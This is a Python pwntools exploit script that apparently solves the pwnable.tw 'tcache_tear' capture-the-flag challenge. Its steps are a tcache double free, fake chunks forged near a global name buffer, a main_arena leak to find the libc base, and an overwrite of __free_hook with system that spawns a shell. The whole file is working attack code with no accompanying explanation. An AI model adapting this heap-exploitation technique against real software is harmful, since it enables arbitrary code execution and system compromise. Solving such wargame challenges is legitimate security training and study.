#!/usr/bin/env python3

from pwn import *
import sys

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10207

    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)

    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)


# OFFSET & VARIABLES
PTR = 0x602088
NAME_VARIABLE = 0x602060
MAIN_ARENA_OFFSET = libc.symbols["main_arena"] + 0x60
SYSTEM_OFFSET = libc.symbols["system"]
FREE_HOOK_OFFSET = libc.symbols["__free_hook"]

# FUNCTIONS
def init(p):
    p.sendlineafter(b"Name:", b"A")

def free(p):
    p.sendlineafter(b"Your choice :", b"2")

def malloc(p, size, data):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Size:", B(size))
    p.sendafter(b"Data:", data if isinstance(data, bytes) else B(data))

def info(p):
    p.sendlineafter(b"Your choice :", b"3")


# MAIN
def main():
    p = connect()

    init(p)

    # Chunk B & C
    write_data = flat(
        0,
        0x21,
        0, 0, 0,
        0x21 # Chunk C
    )

    malloc(p, 0x40, "A")
    free(p)
    free(p)
    malloc(p, 0x40, p64(NAME_VARIABLE - 0x10 + 0x420))
    malloc(p, 0x40, p64(NAME_VARIABLE - 0x10 + 0x420))
    malloc(p, 0x40, write_data)

    # Chunk A
    write_data = flat(
        0,
        0x421,
        0, 0, 0, 0, 0,
        NAME_VARIABLE
    )

    malloc(p, 0x50, "A")
    free(p)
    free(p)
    malloc(p, 0x50, p64(NAME_VARIABLE - 0x10))
    malloc(p, 0x50, p64(NAME_VARIABLE - 0x10))
    malloc(p, 0x50, write_data)

    free(p)
    info(p)

    p.recvuntil(b"Name :")
    LEAK_MAIN_AREA = u64(p.recv(6).ljust(8, b"\0"))

    libc.base = LEAK_MAIN_AREA - MAIN_ARENA_OFFSET

    FREE_HOOK_ADDRESS = libc.base + FREE_HOOK_OFFSET
    SYSTEM_ADDRESS = libc.base + SYSTEM_OFFSET

    malloc(p, 0x30, "A")
    free(p)
    free(p)
    malloc(p, 0x30, p64(FREE_HOOK_ADDRESS))
    malloc(p, 0x30, p64(FREE_HOOK_ADDRESS))
    malloc(p, 0x30, p64(SYSTEM_ADDRESS))

    malloc(p, 0x40, "/bin/sh\0")
    free(p)

    p.interactive()


if __name__ == '__main__':
    main()